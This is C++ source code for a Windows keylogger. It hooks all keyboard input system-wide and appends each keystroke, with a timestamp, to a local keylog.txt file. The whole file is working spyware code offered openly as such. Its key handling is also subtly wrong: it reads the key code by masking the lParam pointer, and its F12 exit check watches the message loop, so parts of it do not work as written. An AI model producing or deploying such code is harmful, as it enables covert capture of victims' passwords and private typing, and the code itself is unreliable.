#include <windows.h>
#include <iostream>
#include <fstream>
#include <ctime>

using namespace std;

void logKey(int key) {
    ofstream logFile("keylog.txt", ios::app);
    if (logFile.is_open()) {
        time_t now = time(0);
        logFile << "[" << ctime(&now) << "] ";
        
        switch (key) {
            case VK_SPACE: logFile << " "; break;
            case VK_RETURN: logFile << "\n"; break;
            case VK_BACK: logFile << "[BACKSPACE]"; break;
            case VK_TAB: logFile << "[TAB]"; break;
            case VK_SHIFT: logFile << "[SHIFT]"; break;
            case VK_CONTROL: logFile << "[CTRL]"; break;
            case VK_MENU: logFile << "[ALT]"; break;
            default:
                if (key >= 'A' && key <= 'Z' || key >= '0' && key <= '9') {
                    logFile << (char)key;
                } else {
                    logFile << "[" << key << "]";
                }
        }
        logFile.close();
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        int key = (int)lParam & 0xFF;
        logKey(key);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        cout << "Failed to install hook!" << endl;
        return 1;
    }

    cout << "Keylogger running. Press F12 to exit.\n";
    MSG msg;
    bool running = true;
    while (running && GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_KEYDOWN && msg.wParam == VK_F12) {
            running = false;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    return 0;
}